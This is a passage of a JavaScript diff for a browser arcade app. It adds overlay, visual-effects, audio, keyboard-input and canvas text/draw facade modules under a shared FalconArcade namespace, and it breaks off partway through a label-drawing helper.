+    // Calling show() triggers the whole transition exactly like clicking "return".
+    show: _late(() => (typeof returnToDashboard === 'function' ? returnToDashboard : null)),
+    hide: null, // flow is self-contained — ends by removing its own overlay
+    isOpen() { return !!document.getElementById('return-to-menu-overlay'); },
+  };
+  _registry['attract'] = {
+    // _dashboardAttract is a `let` declared later in this block (line ~5604);
+    // reference is resolved at call time via closure, so it's ready by the
+    // time user input fires show('attract').
+    show: _late(() => (_dashboardAttract && _dashboardAttract.start) ? _dashboardAttract.start : null),
+    hide: _late(() => (_dashboardAttract && _dashboardAttract.stop) ? _dashboardAttract.stop : null),
+    isOpen: _late(() => (_dashboardAttract && _dashboardAttract.isActive) ? _dashboardAttract.isActive : null),
+  };
+  _registry['post-game-cta'] = {
+    // window._showPostGameCTA is defined at top of block 1 (~line 1189).
+    // Accepts an optional onClose callback, matches the original signature.
+    show: _late(() => (typeof window._showPostGameCTA === 'function' ? window._showPostGameCTA : null)),
+    hide() {
+      const el = document.getElementById('fr-cta-card-overlay');
+      if (el) { el.remove(); return true; }
+      return false;
+    },
+    isOpen() { return !!document.getElementById('fr-cta-card-overlay'); },
+  };
+
+  // ── Dispatcher ─────────────────────────────────────────────────────────
+  function show(name /* , ...args */) {
+    const e = _registry[name];
+    if (!e || typeof e.show !== 'function') return false;
+    const args = Array.prototype.slice.call(arguments, 1);
+    try { e.show.apply(null, args); return true; } catch (_) { return false; }
+  }
+  function hide(name /* , ...args */) {
+    const e = _registry[name];
+    if (!e || typeof e.hide !== 'function') return false;
+    const args = Array.prototype.slice.call(arguments, 1);
+    try { e.hide.apply(null, args); return true; } catch (_) { return false; }
+  }
+  function clear(name) {
+    // Close first (if the controller has a hide), then remove any residual
+    // DOM. This handles both flow-style overlays (which remove themselves)
+    // and state-style overlays (which just toggle classes).
+    const e = _registry[name];
+    if (e && typeof e.hide === 'function') {
+      try { e.hide(); } catch (_) {}
+    }
+    // Candidate ids to clean up — try the name and a few common suffixes.
+    const tries = [name, name + '-overlay'];
+    let removed = false;
+    for (const id of tries) {
+      const el = document.getElementById(id);
+      if (el && el.parentNode) {
+        try { el.parentNode.removeChild(el); removed = true; } catch (_) {}
+      }
+    }
+    return removed || !!e;
+  }
+  function isOpen(name) {
+    const e = _registry[name];
+    if (e && typeof e.isOpen === 'function') {
+      try { return !!e.isOpen(); } catch (_) { return false; }
+    }
+    // Fallback: element presence + 'is-open' class OR just presence for
+    // transient overlays (deploy, return-to-menu, dash-disclaimer, cta).
+    const tries = [name, name + '-overlay'];
+    for (const id of tries) {
+      const el = document.getElementById(id);
+      if (el) return el.classList.contains('is-open') || true;
+    }
+    return false;
+  }
+  function list() { return Object.keys(_registry).slice(); }
+
+  function register(name, handlers) {
+    if (!name || !handlers) return false;
+    _registry[name] = Object.assign({}, _registry[name] || {}, handlers);
+    return true;
+  }
+  function unregister(name) {
+    if (_registry[name]) { delete _registry[name]; return true; }
+    return false;
+  }
+
+  // ── Game-specific: form (lead capture) ─────────────────────────────────
+  function registerForm(gameId, fn) {
+    if (!gameId || typeof fn !== 'function') return false;
+    _aliasesFor(gameId).forEach(k => { _forms[k] = fn; });
+    _forms[gameId] = fn;
+    return true;
+  }
+  function showForm(data) {
+    data = data || {};
+    const gid = data.gameId || _activeGid();
+    const fn = gid ? _forms[gid] : null;
+    if (typeof fn !== 'function') return false;
+    try { fn(data); return true; } catch (_) { return false; }
+  }
+  function hasForm(gameId) {
+    return typeof _forms[gameId || _activeGid()] === 'function';
+  }
+
+  // ── Game-specific: toast ───────────────────────────────────────────────
+  // No built-in toast DOM is created here — that would add visual surface
+  // which the task explicitly forbids ("Do not change … copy, layout, colors,
+  // spacing, or animation style"). Games can call registerToast(gameId, fn)
+  // to plug their existing per-game _toast function into this namespace.
+  function registerToast(gameId, fn) {
+    if (!gameId || typeof fn !== 'function') return false;
+    _aliasesFor(gameId).forEach(k => { _toasts[k] = fn; });
+    _toasts[gameId] = fn;
+    return true;
+  }
+  function toast(msg, color) {
+    const gid = _activeGid();
+    const fn = gid ? _toasts[gid] : null;
+    if (typeof fn !== 'function') return false;
+    try { fn(msg, color); return true; } catch (_) { return false; }
+  }
+
+  // ── Attract shortcuts ──────────────────────────────────────────────────
+  function showAttract() { return show('attract'); }
+  function hideAttract(reason) { return hide('attract', reason || 'api'); }
+
+  window.FalconArcade.Overlay = Object.freeze({
+    // Spec public API
+    show, hide, clear,
+    showForm, showAttract, toast,
+    // Extensions
+    isOpen, list,
+    register, unregister,
+    registerForm, registerToast,
+    hasForm,
+    hideAttract,
+  });
+})();
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Task 4 — FX facade (reusable visual effects)
+// Installs window.FalconArcade.FX = { matrix, particles, counter } as a thin,
+// additive surface. Behavior of every existing call site is preserved: this
+// task does NOT migrate any of the three in-game FalconRanking matrix/burst/
+// counter implementations, nor the dashboard matrix IIFE at ~6587. The FX
+// facade's defaults are a byte-for-byte copy of the Block 3 (Zero/Defense)
+// frame-rank implementation — the canonical shared baseline. Hunt's themed
+// variant (purple #AA00FF, reduced glyph pool, rgba(2,3,8,0.14) fade) lives
+// in Hunt's FalconRanking IIFE and keeps its theme untouched. See
+// .claude/studio/spec-fx-api.md + spec-fx-api-amend1.md for rationale.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeFX(){
+  if (!window.FalconArcade) return;
+
+  // ── Matrix rain ────────────────────────────────────────────────────────
+  // Canonical values come from FalconRanking Block 3 (_startMatrix @ 7466).
+  const _MATRIX_GLYPHS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&<>{}[]FALCON';
+  const _MATRIX_COL_W  = 16;
+  const _MATRIX_FADE   = 'rgba(2,4,8,0.14)';
+  const _MATRIX_RED    = '#e0003c';
+  const _MATRIX_CYAN   = '#42d9ff';
+  const _MATRIX_WHITE  = '#ffffff';
+  let   _matrixCv  = null;
+  let   _matrixCtx = null;
+  let   _matrixAF  = 0;
+  let   _matrixDrops = null;
+
+  function _fxMatrixStart(canvas){
+    if (!canvas) return;
+    _fxMatrixStop();
+    _matrixCv  = canvas;
+    _matrixCv.width  = window.innerWidth;
+    _matrixCv.height = window.innerHeight;
+    _matrixCtx = _matrixCv.getContext('2d');
+    const cols = Math.floor(_matrixCv.width / _MATRIX_COL_W);
+    _matrixDrops = Array(cols).fill(1);
+    function step(){
+      if (!_matrixCtx || !_matrixCv) return;
+      _matrixCtx.fillStyle = _MATRIX_FADE;
+      _matrixCtx.fillRect(0, 0, _matrixCv.width, _matrixCv.height);
+      for (let i = 0; i < _matrixDrops.length; i++){
+        const ch = _MATRIX_GLYPHS[Math.floor(Math.random() * _MATRIX_GLYPHS.length)];
+        const bright = Math.random() > 0.92;
+        _matrixCtx.fillStyle = bright ? _MATRIX_WHITE : (Math.random() > 0.5 ? _MATRIX_RED : _MATRIX_CYAN);
+        _matrixCtx.font = (bright ? 'bold ' : '') + '13px monospace';
+        _matrixCtx.fillText(ch, i * _MATRIX_COL_W, _matrixDrops[i] * _MATRIX_COL_W);
+        if (_matrixDrops[i] * _MATRIX_COL_W > _matrixCv.height && Math.random() > 0.975) _matrixDrops[i] = 0;
+        _matrixDrops[i]++;
+      }
+      _matrixAF = requestAnimationFrame(step);
+    }
+    step();
+  }
+
+  function _fxMatrixStop(){
+    if (_matrixAF){ cancelAnimationFrame(_matrixAF); _matrixAF = 0; }
+    if (_matrixCtx && _matrixCv) _matrixCtx.clearRect(0, 0, _matrixCv.width, _matrixCv.height);
+    _matrixCv = null; _matrixCtx = null; _matrixDrops = null;
+  }
+
+  // ── Particles burst (panel overlay celebration) ─────────────────────────
+  // Canonical values come from FalconRanking Block 3 (_burstParticles @ 7503).
+  const _BURST_DEFAULTS = Object.freeze({
+    count:        80,
+    colors:       ['#ffd84d','#e0003c','#74ff88','#42d9ff','#fff'],
+    speedMin:     60,
+    speedMax:     200,
+    lifeMin:      0.6,
+    lifeMax:      1.1,
+    gravity:      180,
+    sizeMin:      2,
+    sizeMax:      6,
+    originXRatio: 0.5,
+    originYRatio: 0.35,
+    canvasId:     'fr-burst-canvas',
+  });
+
+  function _fxParticlesBurst(panel, opts){
+    if (!panel) return;
+    const o = opts || {};
+    const count        = (o.count        != null) ? o.count        : _BURST_DEFAULTS.count;
+    const colors       = (o.colors       != null) ? o.colors       : _BURST_DEFAULTS.colors;
+    const speedMin     = (o.speedMin     != null) ? o.speedMin     : _BURST_DEFAULTS.speedMin;
+    const speedMax     = (o.speedMax     != null) ? o.speedMax     : _BURST_DEFAULTS.speedMax;
+    const lifeMin      = (o.lifeMin      != null) ? o.lifeMin      : _BURST_DEFAULTS.lifeMin;
+    const lifeMax      = (o.lifeMax      != null) ? o.lifeMax      : _BURST_DEFAULTS.lifeMax;
+    const gravity      = (o.gravity      != null) ? o.gravity      : _BURST_DEFAULTS.gravity;
+    const sizeMin      = (o.sizeMin      != null) ? o.sizeMin      : _BURST_DEFAULTS.sizeMin;
+    const sizeMax      = (o.sizeMax      != null) ? o.sizeMax      : _BURST_DEFAULTS.sizeMax;
+    const originXRatio = (o.originXRatio != null) ? o.originXRatio : _BURST_DEFAULTS.originXRatio;
+    const originYRatio = (o.originYRatio != null) ? o.originYRatio : _BURST_DEFAULTS.originYRatio;
+    const canvasId     = (o.canvasId     != null) ? o.canvasId     : _BURST_DEFAULTS.canvasId;
+
+    let canvas = document.getElementById(canvasId);
+    if (!canvas){
+      canvas = document.createElement('canvas');
+      canvas.id = canvasId;
+      panel.appendChild(canvas);
+    }
+    canvas.width  = panel.offsetWidth;
+    canvas.height = panel.offsetHeight;
+    const ctx = canvas.getContext('2d');
+    const cx  = canvas.width  * originXRatio;
+    const cy  = canvas.height * originYRatio;
+    const spdRange  = speedMax - speedMin;
+    const lifeRange = lifeMax  - lifeMin;
+    const sizeRange = sizeMax  - sizeMin;
+    const particles = Array.from({ length: count }, () => {
+      const a = Math.random() * Math.PI * 2;
+      const s = speedMin + Math.random() * spdRange;
+      return {
+        x: cx, y: cy,
+        vx: Math.cos(a) * s, vy: Math.sin(a) * s,
+        life: lifeMin + Math.random() * lifeRange,
+        max: 1,
+        col: colors[Math.floor(Math.random() * colors.length)],
+        sz: sizeMin + Math.random() * sizeRange,
+      };
+    });
+    let last = 0;
+    function step(ts){
+      const dt = Math.min(0.05, (ts - last) / 1000 || 0.016); last = ts;
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      let alive = false;
+      for (const p of particles){
+        p.x += p.vx * dt; p.y += p.vy * dt; p.vy += gravity * dt; p.life -= dt;
+        if (p.life <= 0) continue; alive = true;
+        ctx.globalAlpha = p.life / p.max;
+        ctx.fillStyle   = p.col;
+        ctx.fillRect(p.x - p.sz/2, p.y - p.sz/2, p.sz, p.sz);
+      }
+      ctx.globalAlpha = 1;
+      if (alive) requestAnimationFrame(step);
+      else canvas.remove();
+    }
+    requestAnimationFrame(step);
+  }
+
+  // ── Counter animation (score roll-up) ───────────────────────────────────
+  // Canonical formula: 1 - (1-p)^3  (ease-out cubic) from _animateCounter @ 7557.
+  function _fxCounterAnimate(el, target, duration){
+    const inert = { cancel(){} };
+    if (!el || !Number.isFinite(target)) return inert;
+    const dur = (duration != null) ? duration : 1200;
+    const start = performance.now();
+    let rafId = 0;
+    let cancelled = false;
+    function step(now){
+      if (cancelled) return;
+      const p = Math.min(1, (now - start) / dur);
+      const eased = 1 - Math.pow(1 - p, 3);
+      el.textContent = Math.floor(eased * target).toLocaleString();
+      if (p < 1) rafId = requestAnimationFrame(step);
+    }
+    rafId = requestAnimationFrame(step);
+    return {
+      cancel(){
+        cancelled = true;
+        if (rafId) cancelAnimationFrame(rafId);
+      }
+    };
+  }
+
+  // ── Public surface ──────────────────────────────────────────────────────
+  const _matrix    = Object.freeze({ start: _fxMatrixStart,    stop: _fxMatrixStop });
+  const _particles = Object.freeze({ burst: _fxParticlesBurst });
+  const _counter   = Object.freeze({ animate: _fxCounterAnimate });
+
+  window.FalconArcade.FX = Object.freeze({
+    matrix:    _matrix,
+    particles: _particles,
+    counter:   _counter,
+  });
+})();
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Task 5 — Audio facade (sound/music routing)
+// Installs window.FalconArcade.Audio as a thin dispatch layer over the already
+// exposed window.SoundEngine, window.SFX, window._defenseSfxRecipe,
+// window._huntSfxRecipe, and the per-game bed start/stop shims in Block 2
+// (lines 19441-19461). The facade routes playSfx by _activeGameId, maps
+// playMusic/stopMusic/fadeMusic onto SoundEngine.music.setScene() (and the
+// menu/boss helpers), and forwards setMuted to SoundEngine.setMuted(). No
+// audio generation logic is rewritten; no existing call site is migrated.
+// See .claude/studio/spec-audio-api.md for the full contract.
+//
+// Load-order note: the facade captures window.* references LAZILY at call
+// time (not at install time). Block 2 runs after Block 1 and is what assigns
+// window.SoundEngine etc. By the time any audio call actually fires (after
+// user gesture + game start), Block 2 has executed. Any earlier call is a
+// silent no-op.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeAudio(){
+  if (!window.FalconArcade) return;
+
+  // Known scene names for setScene() — matches dispatcher at lines ~9592-9644.
+  const _SCENES = Object.freeze(['boss','defense','hunt','auto','silence','menu']);
+
+  function _safeCall(fn, ...args){
+    try { if (typeof fn === 'function') return fn(...args); } catch(_){ }
+  }
+
+  function _audioPlaySfx(name, opts){
+    if (!name) return;
+    const gid = window._activeGameId;
+    const o = opts || {};
+    const SE  = window.SoundEngine;
+    const SFX = window.SFX;
+    if (gid === 'zero'){
+      if (SFX && typeof SFX[name] === 'function'){
+        try { return SFX[name](o); } catch(_){ }
+      }
+      if (SE && SE.sfx && typeof SE.sfx.play === 'function'){
+        try { return SE.sfx.play(name, o); } catch(_){ }
+      }
+      return;
+    }
+    if (gid === 'defense'){
+      if (typeof window._defenseSfxRecipe === 'function'){
+        try { return window._defenseSfxRecipe(name, o); } catch(_){ }
+      }
+      if (SE && SE.sfx && typeof SE.sfx.play === 'function'){
+        try { return SE.sfx.play(name, o); } catch(_){ }
+      }
+      return;
+    }
+    if (gid === 'hunt'){
+      if (typeof window._huntSfxRecipe === 'function'){
+        try { return window._huntSfxRecipe(name, o); } catch(_){ }
+      }
+      if (SE && SE.sfx && typeof SE.sfx.play === 'function'){
+        try { return SE.sfx.play(name, o); } catch(_){ }
+      }
+      return;
+    }
+    // Dashboard / unknown — best-effort generic dispatch.
+    if (SE && SE.sfx && typeof SE.sfx.play === 'function'){
+      try { return SE.sfx.play(name, o); } catch(_){ }
+    }
+  }
+
+  function _audioPlayMusic(track, opts){
+    if (!track) return;
+    const o = opts || {};
+    const SE = window.SoundEngine;
+    if (track === 'menu'){
+      return _safeCall(window._startMenuBed, o.volume);
+    }
+    if (track === 'boss'){
+      if (typeof window.startBossMusic === 'function'){
+        return _safeCall(window.startBossMusic);
+      }
+      if (SE && SE.music && typeof SE.music.setScene === 'function'){
+        try { return SE.music.setScene('boss'); } catch(_){ }
+      }
+      return;
+    }
+    // defense / hunt / auto / silence — all routed through setScene().
+    if (SE && SE.music && typeof SE.music.setScene === 'function'){
+      try { return SE.music.setScene(track); } catch(_){ }
+    }
+  }
+
+  function _audioStopMusic(){
+    _safeCall(window._stopMenuBed);
+    _safeCall(window.stopBossMusic);
+    const SE = window.SoundEngine;
+    if (SE && SE.music && typeof SE.music.setScene === 'function'){
+      try { SE.music.setScene('silence'); } catch(_){ }
+    }
+  }
+
+  function _audioFadeMusic(track, ms){
+    // `ms` is advisory — SoundEngine's scene dispatcher uses its own
+    // hardcoded fade curves (0.6-1.8s per target). We preserve those to
+    // avoid any mix/timing change (spec §NON-GOALS: do not alter fades).
+    return _audioPlayMusic(track, { fadeMs: ms });
+  }
+
+  function _audioSetMuted(flag){
+    const SE = window.SoundEngine;
+    if (SE && typeof SE.setMuted === 'function'){
+      try { SE.setMuted(!!flag); } catch(_){ }
+    }
+  }
+
+  window.FalconArcade.Audio = Object.freeze({
+    playSfx:   _audioPlaySfx,
+    playMusic: _audioPlayMusic,
+    stopMusic: _audioStopMusic,
+    fadeMusic: _audioFadeMusic,
+    setMuted:  _audioSetMuted,
+    // Read-only helper: list of scene names playMusic/fadeMusic accept
+    // (matches SoundEngine.music.setScene dispatcher surface).
+    scenes:    _SCENES,
+  });
+})();
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Task 6 — Input facade (keyboard binding registry)
+// Installs window.FalconArcade.Input as a thin observer-only layer on top of
+// document keydown/keyup. The facade does NOT migrate any existing listener.
+// All 18 pre-existing keydown/keyup handlers (CTA close, mission-brief, dash
+// shortcuts incl. Ctrl+Shift+E/R admin, gameplay KEYS/JP tracking, leaderboard
+// idle watchers, attract dismissers) keep their exact semantics.
+//
+// Public surface (frozen):
+//   Input.declare(name, descriptor)     — register a key-spec under an action name
+//   Input.bind(actionOrDesc, handler)   — attach handler (descriptor or pre-declared name)
+//   Input.unbind(actionOrName)          — remove handler
+//   Input.enableContext(name)           — activate a named context
+//   Input.disableContext(name)          — deactivate a named context
+//   Input.isContextEnabled(name)        — boolean
+//   Input.contexts                      — frozen array of known context names
+//
+// Observer-only contract: never preventDefault, never stopPropagation, never
+// stopImmediatePropagation, never mutate KEYS/JP/PAUSED/state. Bubble phase
+// listener so it fires AFTER existing listeners (existing preventDefault wins).
+//
+// Default focus exception: if document.activeElement is INPUT/TEXTAREA/SELECT
+// and the binding's allowInInputs is false (default), the handler is skipped.
+// Callers that need to fire inside form fields (rank-entry submit, etc.) must
+// opt in with { allowInInputs: true }.
+//
+// See .claude/studio/spec-input-api.md and spec-input-api-amend1.md.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeInput(){
+  if (!window.FalconArcade) return;
+
+  // Known context names (advisory enum; bind() accepts any string).
+  const _CONTEXTS = Object.freeze([
+    'dashboard', 'mission-brief', 'form-modal',
+    'zero-game', 'defense-game', 'hunt-game',
+    'leaderboard', 'boot-loader', 'global',
+  ]);
+
+  // Internal state — fully encapsulated in this IIFE.
+  const _descriptors = new Map();   // name → descriptor
+  const _handlers    = new Map();   // name → handler fn
+  const _activeCtx   = new Set();
+
+  // Parse a key spec string like "ctrl+shift+KeyE" or "Escape" or "Space".
+  // Returns { mods: { ctrl, shift, alt, meta }, code }.
+  // Arrays of specs are allowed via _parseKeys() below.
+  function _parseKeySpec(spec){
+    if (typeof spec !== 'string' || spec.length === 0) return null;
+    const parts = spec.split('+').map(p => p.trim());
+    const code  = parts.pop();
+    const mods  = { ctrl:false, shift:false, alt:false, meta:false };
+    for (const p of parts){
+      const k = p.toLowerCase();
+      if      (k === 'ctrl' || k === 'control') mods.ctrl  = true;
+      else if (k === 'shift')                   mods.shift = true;
+      else if (k === 'alt')                     mods.alt   = true;
+      else if (k === 'meta' || k === 'cmd')     mods.meta  = true;
+    }
+    return { mods, code };
+  }
+  function _parseKeys(keys){
+    if (keys == null) return [];
+    if (Array.isArray(keys)) return keys.map(_parseKeySpec).filter(Boolean);
+    const one = _parseKeySpec(keys);
+    return one ? [one] : [];
+  }
+  function _eventMatches(parsed, e){
+    if (e.code !== parsed.code) return false;
+    if (!!e.ctrlKey  !== !!parsed.mods.ctrl)  return false;
+    if (!!e.shiftKey !== !!parsed.mods.shift) return false;
+    if (!!e.altKey   !== !!parsed.mods.alt)   return false;
+    if (!!e.metaKey  !== !!parsed.mods.meta)  return false;
+    return true;
+  }
+  function _focusBlocked(allowInInputs){
+    if (allowInInputs === true) return false;
+    const tag = (document.activeElement && document.activeElement.tagName) || '';
+    return tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
+  }
+  function _normalizeDescriptor(d){
+    // Returns a frozen descriptor with defaults applied.
+    const ctx = (d && typeof d.context === 'string') ? d.context : 'global';
+    const allow = (d && d.allowInInputs === true);
+    const parsed = _parseKeys(d && d.keys);
+    return Object.freeze({
+      context: ctx,
+      allowInInputs: allow,
+      parsedKeys: Object.freeze(parsed),
+    });
+  }
+
+  function _inputDeclare(name, descriptor){
+    if (typeof name !== 'string' || name.length === 0) return;
+    _descriptors.set(name, _normalizeDescriptor(descriptor || {}));
+  }
+  function _inputBind(actionOrDesc, handler){
+    if (typeof handler !== 'function') return;
+    let name, desc;
+    if (typeof actionOrDesc === 'string'){
+      name = actionOrDesc;
+      // If not pre-declared, register an inert placeholder (safe: matches nothing).
+      if (!_descriptors.has(name)) _descriptors.set(name, _normalizeDescriptor({}));
+    } else if (actionOrDesc && typeof actionOrDesc === 'object'){
+      name = (typeof actionOrDesc.name === 'string') ? actionOrDesc.name : null;
+      if (!name) return;
+      desc = _normalizeDescriptor(actionOrDesc);
+      _descriptors.set(name, desc);
+    } else {
+      return;
+    }
+    _handlers.set(name, handler);
+  }
+  function _inputUnbind(actionOrName){
+    const name = (typeof actionOrName === 'string')
+      ? actionOrName
+      : (actionOrName && typeof actionOrName === 'object' ? actionOrName.name : null);
+    if (!name) return;
+    _handlers.delete(name);
+  }
+  function _inputEnableContext(name){
+    if (typeof name === 'string' && name.length) _activeCtx.add(name);
+  }
+  function _inputDisableContext(name){
+    if (typeof name === 'string' && name.length) _activeCtx.delete(name);
+  }
+  function _inputIsContextEnabled(name){
+    return (typeof name === 'string') && _activeCtx.has(name);
+  }
+
+  function _onKeyDown(e){
+    // Iterate registered handlers. Order is insertion order (Map semantics).
+    // Cheap early-out for typical case (few bindings).
+    if (_handlers.size === 0) return;
+    for (const [name, handler] of _handlers){
+      const desc = _descriptors.get(name);
+      if (!desc) continue;
+      if (!_activeCtx.has(desc.context)) continue;
+      if (_focusBlocked(desc.allowInInputs)) continue;
+      const keys = desc.parsedKeys;
+      if (keys.length === 0) continue;
+      let matched = false;
+      for (let i = 0; i < keys.length; i++){
+        if (_eventMatches(keys[i], e)){ matched = true; break; }
+      }
+      if (!matched) continue;
+      try { handler(e); } catch(_){ /* never throw from observer */ }
+    }
+  }
+  function _onKeyUp(_e){
+    // v1: no keyup routing. Reserved for future (sustained-press semantics).
+  }
+
+  // Bubble phase: existing listeners run first and may preventDefault. The
+  // facade sees the event afterwards. Capture is intentionally NOT used.
+  if (typeof document !== 'undefined' && document.addEventListener){
+    document.addEventListener('keydown', _onKeyDown, false);
+    document.addEventListener('keyup',   _onKeyUp,   false);
+  }
+
+  window.FalconArcade.Input = Object.freeze({
+    declare:           _inputDeclare,
+    bind:              _inputBind,
+    unbind:            _inputUnbind,
+    enableContext:     _inputEnableContext,
+    disableContext:    _inputDisableContext,
+    isContextEnabled:  _inputIsContextEnabled,
+    contexts:          _CONTEXTS,
+  });
+})();
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Task 7 — Text & Draw facades (additive canvas helpers)
+// Installs window.FalconArcade.Text and window.FalconArcade.Draw as ADDITIVE
+// canvas helpers. Per the project rule, this task does NOT migrate any
+// existing call site. Existing wrapTextPx/wrapText/roundRect/fillText sites
+// remain byte-identical.
+//
+// Public surface (frozen):
+//   Text.wrap(ctx, text, maxW)         — MIRROR of wrapTextPx @ 7158
+//   Text.fit(ctx, text, opts)          — NEW auto-shrink-to-width helper
+//   Draw.panel(ctx, x, y, w, h, opts)  — NEW canonical bg+border+glow rect
+//   Draw.label(ctx, text, x, y, opts)  — NEW text with plate background
+//   Draw.glowText(ctx, text, x, y, opts) — NEW shadow-glow fillText wrapper
+//
+// Behavioral contract:
+// - All helpers save/restore the ctx state THEY touch (font, fillStyle,
+//   strokeStyle, shadowColor, shadowBlur, lineWidth, textAlign, textBaseline).
+//   They do NOT save/restore globalAlpha — caller retains transparency control.
+// - Helpers never call T()/TF(); callers must pre-translate strings.
+// - Min font (9px CLAUDE.md rule) enforced inside Text.fit only.
+// - Helpers no-op if ctx is missing or invalid.
+// - Block 4 Hunt has a 2-arg closure-scoped wrapTextPx (line 31288+) that
+//   captures ctx from its enclosing scope. That variant is intentionally NOT
+//   exposed/migrated — callers wanting global access pass ctx to Text.wrap.
+//
+// See .claude/studio/spec-text-draw-api.md and spec-text-draw-api-amend1.md.
+// ─────────────────────────────────────────────────────────────────────────────
+(function _installFalconArcadeTextDraw(){
+  if (!window.FalconArcade) return;
+
+  // ─── Text.wrap — MIRROR of wrapTextPx @ line 7158 ─────────────────────────
+  function _textWrap(ctx, text, maxW){
+    if (!ctx || typeof ctx.measureText !== 'function') return [];
+    const words = String(text == null ? '' : text).split(' ');
+    const lines = [];
+    let line = '';
+    for (const w of words){
+      const test = (line ? line + ' ' : '') + w;
+      if (ctx.measureText(test).width > maxW && line){
+        lines.push(line);
+        line = w;
+      } else {
+        line = test;
+      }
+    }
+    if (line) lines.push(line);
+    return lines;
+  }
+
+  // ─── Text.fit — NEW: shrink size by 1px until text fits maxW ──────────────
+  // opts = { family (REQUIRED), weight:'', maxPx, minPx:9, targetW, setFont:true }
+  // Returns { px, lines } or null if opts invalid. minPx clamps at 9 per CLAUDE.md.
+  function _textFit(ctx, text, opts){
+    if (!ctx || typeof ctx.measureText !== 'function') return null;
+    if (!opts || typeof opts.family !== 'string' || opts.family.length === 0) return null;
+    const family = opts.family;
+    const weight = (typeof opts.weight === 'string') ? opts.weight : '';
+    const minPx  = Math.max(9, (Number.isFinite(opts.minPx) ? opts.minPx : 9));
+    const maxPx  = Math.max(minPx, (Number.isFinite(opts.maxPx) ? opts.maxPx : 24));
+    const targetW = Number.isFinite(opts.targetW) ? opts.targetW : Infinity;
+    const setFont = (opts.setFont !== false);
+    const str = String(text == null ? '' : text);
+    const prevFont = ctx.font;
+    let chosen = minPx;
+    for (let px = maxPx; px >= minPx; px -= 1){
+      ctx.font = (weight ? weight + ' ' : '') + px + 'px ' + family;
+      if (ctx.measureText(str).width <= targetW){ chosen = px; break; }
+      chosen = minPx;
+    }
+    // Wrap into lines using the chosen font
+    ctx.font = (weight ? weight + ' ' : '') + chosen + 'px ' + family;
+    const lines = _textWrap(ctx, str, targetW);
+    if (!setFont) ctx.font = prevFont;
+    return { px: chosen, lines };
+  }
+
+  window.FalconArcade.Text = Object.freeze({
+    wrap: _textWrap,
+    fit:  _textFit,
+  });
+
+  // ─── Draw.panel — NEW: canonical bg+border+glow rounded-rect ──────────────
+  // opts = { r:6, bg:'rgba(6,10,16,0.68)', border:'#42d9ff', borderW:1,
+  //          glow:14, glowColor:(=border), fill:true, stroke:true }
+  // CLAUDE.md compliance: bg alpha 0.62-0.72, radius 4-8, glow 10-18.
+  function _drawPanel(ctx, x, y, w, h, opts){
+    if (!ctx || typeof ctx.save !== 'function') return;
+    const o = opts || {};
+    const r        = Number.isFinite(o.r) ? o.r : 6;
+    const bg       = (typeof o.bg === 'string') ? o.bg : 'rgba(6,10,16,0.68)';
+    const border   = (typeof o.border === 'string') ? o.border : '#42d9ff';
+    const borderW  = Number.isFinite(o.borderW) ? o.borderW : 1;
+    const glow     = Number.isFinite(o.glow) ? o.glow : 14;
+    const glowCol  = (typeof o.glowColor === 'string') ? o.glowColor : border;
+    const doFill   = (o.fill   !== false);
+    const doStroke = (o.stroke !== false);
+    ctx.save();
+    if (doFill){
+      ctx.fillStyle = bg;
+      ctx.beginPath();
+      if (typeof ctx.roundRect === 'function'){
+        ctx.roundRect(x, y, w, h, r);
+      } else {
+        // Fallback: manual rounded-rect path (older canvas builds)
+        const _r = Math.max(0, Math.min(r, w/2, h/2));
+        ctx.moveTo(x+_r, y);
+        ctx.arcTo(x+w, y,   x+w, y+h, _r);
+        ctx.arcTo(x+w, y+h, x,   y+h, _r);
+        ctx.arcTo(x,   y+h, x,   y,   _r);
+        ctx.arcTo(x,   y,   x+w, y,   _r);
+        ctx.closePath();
+      }
+      ctx.fill();
+    }
+    if (doStroke){
+      ctx.strokeStyle = border;
+      ctx.lineWidth   = borderW;
+      ctx.shadowColor = glowCol;
+      ctx.shadowBlur  = glow;
+      if (!doFill){
+        // Need a path if we didn't already build one for fill
+        ctx.beginPath();
+        if (typeof ctx.roundRect === 'function'){
+          ctx.roundRect(x, y, w, h, r);
+        } else {
+          const _r = Math.max(0, Math.min(r, w/2, h/2));
+          ctx.moveTo(x+_r, y);
+          ctx.arcTo(x+w, y,   x+w, y+h, _r);
+          ctx.arcTo(x+w, y+h, x,   y+h, _r);
+          ctx.arcTo(x,   y+h, x,   y,   _r);
+          ctx.arcTo(x,   y,   x+w, y,   _r);
+          ctx.closePath();
+        }
+      }
+      ctx.stroke();
+    }
+    ctx.restore();
+  }
+
+  // ─── Draw.label — NEW: text with semi-opaque plate background ─────────────
+  // opts = { font, color:'#e7f1ff', plateColor:'rgba(0,0,0,0.62)',
+  //          padX:6, padY:3, align:'center', baseline:'middle',
+  //          radius:0, border:null, borderW:1, glow:0, glowColor:null }
+  // For inner-item plates per CLAUDE.md, pass plateColor with 0.50-0.55 alpha.
+  function _drawLabel(ctx, text, x, y, opts){
+    if (!ctx || typeof ctx.fillText !== 'function') return;
+    const o = opts || {};
+    const str = String(text == null ? '' : text);
+    const color   = (typeof o.color === 'string') ? o.color : '#e7f1ff';
+    const plate   = (typeof o.plateColor === 'string') ? o.plateColor : 'rgba(0,0,0,0.62)';
+    const padX    = Number.isFinite(o.padX) ? o.padX : 6;
+    const padY    = Number.isFinite(o.padY) ? o.padY : 3;
+    const align   = (typeof o.align === 'string') ? o.align : 'center';
+    const base    = (typeof o.baseline === 'string') ? o.baseline : 'middle';
+    const radius  = Number.isFinite(o.radius) ? o.radius : 0;
+    const border  = (typeof o.border === 'string') ? o.border : null;
+    const borderW = Number.isFinite(o.borderW) ? o.borderW : 1;
+    const glow    = Number.isFinite(o.glow) ? o.glow : 0;
+    const glowCol = (typeof o.glowColor === 'string') ? o.glowColor : color;
+    ctx.save();
+    if (typeof o.font === 'string') ctx.font = o.font;
+    ctx.textAlign    = align;
+    ctx.textBaseline = base;
+    const m = ctx.measureText(str);
+    const textW = m.width;
